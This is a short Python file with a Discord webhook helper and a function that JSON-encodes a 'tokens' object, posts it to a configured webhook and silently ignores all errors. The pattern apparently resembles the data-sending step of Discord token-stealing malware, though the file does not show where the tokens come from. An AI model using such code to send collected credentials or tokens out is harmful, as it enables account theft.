import json
import requests
import settings

class DiscordWebhook:
    def __init__(self, url, **kwargs):
        self.url = url
        self.content = kwargs.get("content")
        self.username = kwargs.get("username")
        self.timeout = 30000

    def execute(self):
        r = requests.post(self.url, json={'content': self.content, 'username': self.username}, params={'wait': True}, timeout=self.timeout)
        return r

def postToWebhook(tokens):
    try:
        webhook = DiscordWebhook(url = settings.webhook['url'], content = json.dumps(tokens), username = settings.webhook['username'])
        webhook.execute()
    except:
        pass